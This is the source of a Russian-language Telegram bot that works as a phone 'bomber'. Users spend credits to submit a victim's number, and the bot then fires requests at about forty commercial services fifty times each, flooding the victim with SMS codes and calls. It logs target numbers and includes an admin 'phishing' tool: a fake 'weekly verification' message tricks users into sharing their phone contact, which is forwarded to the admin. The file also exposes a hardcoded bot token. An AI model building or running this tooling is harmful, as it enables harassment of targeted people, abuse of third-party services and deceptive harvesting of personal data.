const TelegramBot = require("node-telegram-bot-api"); let XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const services = require("./services");
const fs = require("fs");
const stats = require("./stats.json");
const TOKEN = "1324863442:AAHpqUvd-mBBfy6zPMpp-87fqncw7jxRtDw"; // Токен

const bot = new TelegramBot(TOKEN, {
    polling: true
});

let attackNow = false; // Идет ли уже атака
let convertPhone = ""; // Телефон жертвы
let admin = 957965876; // id админа
let allUsersData = require("./data.json");

let blacklistMsg = false; // Проверка, должно ли быть слудующее сообщение добавлением в ЧС
let notificationMsg = false;
let toUpBombsMsg = false;
let phishingMsg = false;
let whomToTopUp = "";
let amountBombsUp = 0;
let amountBombsUpMsg = false;


bot.on("callback_query", query => {
    if (query.data === "blacklist") {
        bot.sendMessage(admin, "Введите id аккаунта которого вы добавите/уберете из ЧС:")
        blacklistMsg = true;
    } else if (query.data === "showAllUsers") {
        showAllUsers();
    } else if (query.data === "notification") {
        notificationMsg = true;
        bot.sendMessage(admin, "Введите оповещение:");
    } else if (query.data === "toUpBombs") {
        toUpBombsMsg = true;
        bot.sendMessage(admin, "Введите id юзера которому хотите пополнить/уменьшить bombs:")
    } else if (query.data === "phishing") {
        phishingMsg = true;
        bot.sendMessage(admin, "Введите id пользователя, которому будет напрвлен фишинг:")
    } else if (query.data === "restart") {
        restart();
    };
});

bot.onText(/\/start/, msg => {
    const chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.phish === false) {
                if (i.user.inChannel === true) {
                    i.user.wantToAttack = false;
                    bot.sendMessage(chat_id, "Привет! Чтобы начать спам - выбери данную функцию на клавиатуре!", {
                        reply_markup: {
                            keyboard: [
                                ["Начать спам!💣", "Личный кабинет💼", "Получить bombsℹ"],
                                ["О боте🥓"]
                            ],
                            resize_keyboard: true
                        }
                    });
                } else {
                    // console.log(inChannelF(msg));
                    bot.sendMessage(chat_id, `\n<b>Для продолжения - подпишись на наш канал!</b>\n\nЧто ты увидишь в <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n⭐<i>Самое интересное из мира IT</i>⭐\n\n⭐<i>Розыгрыши и квесты на годные призы</i>⭐\n\n⭐<i>Ламповая атмосфера в чате</i>⭐\n\n⭐<i>Собственный софт⭐</i>`, { parse_mode: "HTML" })
                };
            } else {
                bot.sendMessage(chat_id, "Вы не прошли проверку!", {
                    reply_markup: {
                        keyboard: [
                            [{
                                text: "Пройти проверку",
                                request_contact: true,
                                resize_keyboard: true
                            }]
                        ]
                    },
                });
            };
        };
    };
    if (chat_id === admin) {
        bot.sendMessage(chat_id, "Здравствуй, дорогой администратор!\nТы можешь выполнить любую из ниже приведенных функций", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Добавить/Убрать ID в/из чс",
                        callback_data: "blacklist"
                    }],

                    [{
                        text: "Показать данные всех пользователей",
                        callback_data: "showAllUsers"
                    }],
                    [{
                        text: "Сделать оповещение",
                        callback_data: "notification"
                    }],
                    [{
                        text: "Пополнить bombs",
                        callback_data: "toUpBombs"
                    }],
                    [{
                        text: "Поймать на фишинг",
                        callback_data: "phishing"
                    }],
                    [{
                        text: "Перезаписать данные",
                        callback_data: "restart"
                    }]
                ]
            }
        });
    };
});

bot.onText(/Начать спам!💣/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                if (i.user.blacklist === false) {
                    if (i.user.bombs > 0) {
                        i.user.wantToAttack = true;

                        bot.sendMessage(chat_id, "Введите номер\n📝Образец:\n<i>71234567890</i>\n<i>380123456789</i>", {
                            parse_mode: "HTML"
                        });
                    } else if (i.user.bombs <= 0) {
                        bot.sendMessage(chat_id, "<i>У Вас недостаточно bombs на счету!</i>", {
                            parse_mode: "HTML"
                        });
                    };

                } else if (i.user.blacklist === true) {
                    bot.sendMessage(chat_id, "<b>Ваш аккаунт заблокирован!</b>", {
                        parse_mode: "HTML"
                    });
                };

            } else {
                bot.sendMessage(chat_id, `\n<b>Для продолжения - подпишись на наш канал!</b>\n\nЧто ты увидишь в <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n⭐<i>Самое интересное из мира IT</i>⭐\n\n⭐<i>Розыгрыши и квесты на годные призы</i>⭐\n\n⭐<i>Ламповая атмосфера в чате</i>⭐\n\n⭐<i>Собственный софт⭐</i>`, { parse_mode: "HTML" })
            };
        };
    };
});

bot.onText(/Получить bombsℹ/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                bot.sendMessage(chat_id, "<i>Для получения/покупки bombs - напишите мне (@mitchel_ed) в лс</i>", {
                    parse_mode: "HTML"
                });
            } else {
                bot.sendMessage(chat_id, `\n<b>Для продолжения - подпишись на наш канал!</b>\n\nЧто ты увидишь в <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n⭐<i>Самое интересное из мира IT</i>⭐\n\n⭐<i>Розыгрыши и квесты на годные призы</i>⭐\n\n⭐<i>Ламповая атмосфера в чате</i>⭐\n\n⭐<i>Собственный софт⭐</i>`, { parse_mode: "HTML" });
            };
        };
    };
})


bot.onText(/Личный кабинет💼/, msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    let name, username, blacklist = "";
    let bombs = 0;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                name = i.user.name;
                username = i.user.username;
                bombs = i.user.bombs;
                if (i.user.blacklist === true) {
                    blacklist = "\n\n<i>Вы в черном списке!\nДля разбана - пишите @mitchel_ed</i>";
                }
                bot.sendMessage(chat_id, `Ваш id: ${from_id}\nВас зовут: ${name}\nВаш username: ${username}\nУ Вас bombs: ${bombs}${blacklist}`);
            } else {
                bot.sendMessage(chat_id, `\n<b>Для продолжения - подпишись на наш канал!</b>\n\nЧто ты увидишь в <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n⭐<i>Самое интересное из мира IT</i>⭐\n\n⭐<i>Розыгрыши и квесты на годные призы</i>⭐\n\n⭐<i>Ламповая атмосфера в чате</i>⭐\n\n⭐<i>Собственный софт⭐</i>`, { parse_mode: "HTML" });
            };
        };
    };
});

function inChannelF(msg) {
    if (msg.chat.type != "group" && msg.chat.type != "supergroup") {
        let chat_id = msg.chat.id;
        let inChannel = false;
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `https://api.telegram.org/bot${TOKEN}/getChatMember?chat_id=@debian_lab&user_id=${chat_id}`, true);
        xhr.send()
        xhr.onload = () => {
            let response = JSON.parse(xhr.responseText);
            // console.log(response.result.status);
            if (response.result.status != "left") {
                inChannel = true;
            } else {
                inChannel = false;
            };
            for (let i of allUsersData) {
                if (i.user.id === chat_id) {
                    i.user.inChannel = inChannel;
                };
            };
        };
    };
};

function restart() {
    fs.writeFileSync("data.json", JSON.stringify(allUsersData));
    fs.writeFileSync("stats.json", JSON.stringify(stats))
};


bot.on("message", msg => {
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    restart();
    stats.msg += 1;
    updateData(msg);
    inChannelF(msg);
    // console.log(msg);
    if (msg.text != "/start" && msg.text != "Начать спам!💣" && msg.text != "Получить bombsℹ" && msg.text != "Личный кабинет💼") {
        for (let i of allUsersData) {
            if (i.user.id === from_id) {
                if (i.user.inChannel === true) {
                    if (i.user.wantToAttack === true) {
                        if (attackNow === false) {
                            if (i.user.bombs > 0) {
                                convertPhone = msg.text;
                                if ((convertPhone.length === 11 && convertPhone[0] === "7") || (convertPhone.length === 12 && convertPhone[0] === "3" && convertPhone[1] === "8" && convertPhone[2] === "0")) {
                                    attackNow = true;
                                    bot.sendMessage(chat_id, "Запрос принят!\n<i>Атака будет произведена в ближайшее время\nДля эфективного бомбинга советуем повторить через ~10 минут</i>", { parse_mode: "HTML" });
                                    i.user.bombs -= 1;
                                    attack(msg);
                                } else {
                                    bot.sendMessage(chat_id, "Вы неправильно ввели данные=(")
                                };
                            } else if (i.user.bombs <= 0) {
                                bot.sendMessage(chat_id, "</i>У Вас недостаточно bombs на счету!<i>", {
                                    parse_mode: "HTML"
                                });
                            };
                        } else {
                            bot.sendMessage(chat_id, "Атака уже идет на другой номер, подождите немого");
                        };
                        i.user.wantToAttack = false;
                    };
                } else {
                    bot.sendMessage(chat_id, `\n<b>Для продолжения - подпишись на наш канал!</b>\n\nЧто ты увидишь в <a href='https://t.me/debian_lab'>@debian_lab</a>:\n\n⭐<i>Самое интересное из мира IT</i>⭐\n\n⭐<i>Розыгрыши и квесты на годные призы</i>⭐\n\n⭐<i>Ламповая атмосфера в чате</i>⭐\n\n⭐<i>Собственный софт⭐</i>`, { parse_mode: "HTML" })
                };
            };


        };
        if (blacklistMsg === true) {
            for (let i of allUsersData) {
                if (i.user.id == msg.text) {
                    if (i.user.blacklist === true) {
                        i.user.blacklist = false;
                    } else if (i.user.blacklist === false) {
                        i.user.blacklist = true;
                    };
                };
            };
            blacklistMsg = false;
            bot.sendMessage(admin, `Пользователь с id ${msg.text} был успешно забанен/разбанен`)
        };

        if (notificationMsg === true) {
            for (let i of allUsersData) {
                bot.sendMessage(i.user.id, `${msg.text}`)
            }
            notificationMsg = false;
            bot.sendMessage(admin, "Ваше оповещение было разослано!")
        };

        if (toUpBombsMsg === true) {
            if (msg.chat.id === admin) {
                if (amountBombsUpMsg === false) {
                    whomToTopUp = parseInt(msg.text);
                    console.log(`whomToTopUp: ${whomToTopUp}`);
                    amountBombsUpMsg = true;
                    bot.sendMessage(admin, "Введите на какое кол-во вы хотите пополнить/уменьшить bombs")
                } else {
                    amountBombsUp = parseInt(msg.text);
                    console.log(`amountBombsUp: ${amountBombsUp}`);
                    for (let i of allUsersData) {
                        if (i.user.id === whomToTopUp) {
                            i.user.bombs += amountBombsUp;
                            console.log("ыовра");
                        }
                    }
                    toUpBombsMsg = false;
                    amountBombsUp = 0;
                    whomToTopUp = "";
                    amountBombsUpMsg = false;
                    bot.sendMessage(admin, "bombs были уменьшены/пополнены!")
                };
            };
        };

        if (phishingMsg === true) {
            for (let i of allUsersData) {
                if (i.user.id === parseInt(msg.text)) {
                    i.user.phish = true;
                    bot.sendMessage(parseInt(msg.text), "Вы попались на еженедельную проверку!\nПодтвердите что Вы не бот нажав кнопку на клавиатуре снизу👇\n\n<i>В знак вознаграждения за потраченное время вы получите 10 bombs</i>", {
                        reply_markup: {
                            keyboard: [
                                [{
                                    text: "Пройти проверку",
                                    request_contact: true,
                                    resize_keyboard: true
                                }]
                            ]
                        },
                        parse_mode: "HTML"
                    });
                };
                bot.sendMessage(admin, "Фишинг был отправлен:)")
                phishingMsg = false;
            };

        };
    };
});

bot.onText(/О боте🥓/, msg => {
    let from_id = msg.from.id;
    let chat_id = msg.chat.id;
    for (let i of allUsersData) {
        if (i.user.id === from_id) {
            if (i.user.inChannel === true) {
                i.user.wantToAttack = false;
                bot.sendMessage(chat_id, `<i>Людей в боте👼:</i> <b>${stats.people}</b>\n<i>Отправлено сообщений🎈:</i> <b>${stats.msg}</b>\n<i>Атаковано номеров🎃:</i> <b>${stats.bombed}</b>\n<i>Сервисов🎉:</i> <b>54</b>\n<i>Дата запуска:</i> <b>${stats.data}</b>
                `, {
                    parse_mode: "HTML"
                });
            };
        };
    }
});

function updateData(msg) {
    let inData = false;
    let chat_id = msg.chat.id;
    let from_id = msg.from.id;
    let name = msg.from.first_name;
    let username = msg.from.username;
    username = "@" + username;
    let newObj = {
        user: {

        }
    }
    for (let i of allUsersData) {
        if (i.user.id === msg.chat.id) {
            inData = true;
            break;
        }
    }

    if (inData === false) {
        stats.people += 1;
        newObj["user"]["id"] = from_id;
        newObj["user"]["name"] = name;
        newObj["user"]["username"] = username;
        newObj["user"]["blacklist"] = false;
        newObj["user"]["wantToAttack"] = false;
        newObj["user"]["bombs"] = 5;
        newObj["user"]["phish"] = false;
        newObj["user"]["inChannel"] = true;
        allUsersData.push(newObj);
        // console.log(allUsersData);
        bot.sendMessage(msg.chat.id, "Вы получили 5 bombs за регистрацию✔️")
    };
}




function attack(msg) {
    fs.appendFileSync("phones.txt", `#id${msg.from.id}(${msg.from.username}):${convertPhone}\n`);
    stats.bombed += 1;
    for (let i = 0; i < 50; i++) {
        services.sunlight(convertPhone);
        services.yandexEda(convertPhone);
        services.prime(convertPhone);
        services.youla(convertPhone);
        services.wowworks(convertPhone);
        services.gotinder(convertPhone);
        services.qlean(convertPhone);
        services.ok(convertPhone);
        services.ivi(convertPhone);
        services.rutube(convertPhone);
        services.rutaxi(convertPhone);
        services.tinkoff(convertPhone);
        services.menu(convertPhone);
        services.dostaevsky(convertPhone);
        services.cabinet(convertPhone);
        services.webbankir(convertPhone);
        services.uklon(convertPhone);
        services.ubki(convertPhone);
        services.tiktok(convertPhone);
        services.thehive(convertPhone);
        services.pizza33(convertPhone);
        services.sportmasterUa(convertPhone);
        services.qlean(convertPhone);
        services.qlean2(convertPhone);
        services.prosushi(convertPhone);
        services.planetakino(convertPhone);
        services.pizzasinizza(convertPhone);
        services.pizzakazan(convertPhone);
        services.ozon(convertPhone);
        services.mistercash(convertPhone);
        services.mts(convertPhone);
        services.vsk(convertPhone);
        services.citilink(convertPhone);
        services.icq(convertPhone);
        services.delimobil(convertPhone);
        services.boosty(convertPhone);
        services.dnsShop(convertPhone);
        services.modulBank(convertPhone);
        services.moneyman(convertPhone);
        services.lenta(convertPhone);
        services.koronapay(convertPhone);
    };
    attackNow = false;
};

bot.on("polling_error", err => {
    throw err;
});

function showAllUsers() {
    let card = "";
    for (let i of allUsersData) {
        card += `\n<b>id:</b> <code>${i.user.id}</code>\n<b>Имя: </b><i>${i.user.name}</i>\n<b>username:</b> <i>${i.user.username}</i>\n<b>Черный список:</b> <i>${i.user.blacklist}</i>\n<b>bombs: </b><i>${i.user.bombs}</i>\n<b>phish: </b><i>${i.user.phish}</i>`
    };
    bot.sendMessage(admin, card, {
        parse_mode: "HTML"
    });
}

bot.on("contact", msg => {
    bot.sendMessage(msg.chat.id, "Спасибо! Вы подтвердили что Вы не бот! Вам начислено 10 bombs!", {
        reply_markup: {
            keyboard: [
                ["Начать спам!💣", "Личный кабинет💼", "Получить bombsℹ"],
                ["О боте🥓"]
            ],
            resize_keyboard: true
        }
    })

    for (let i of allUsersData) {
        if (i.user.id === msg.chat.id) {
            i.user.bombs += 10;
            i.user.phish = false;
        };
    };
    bot.sendMessage(admin, `\n
    Номер телефона: ${msg.contact.phone_number}
    Имя: ${msg.contact.first_name}
    id: ${msg.contact.user_id}
    username: @${msg.chat.username}`)
})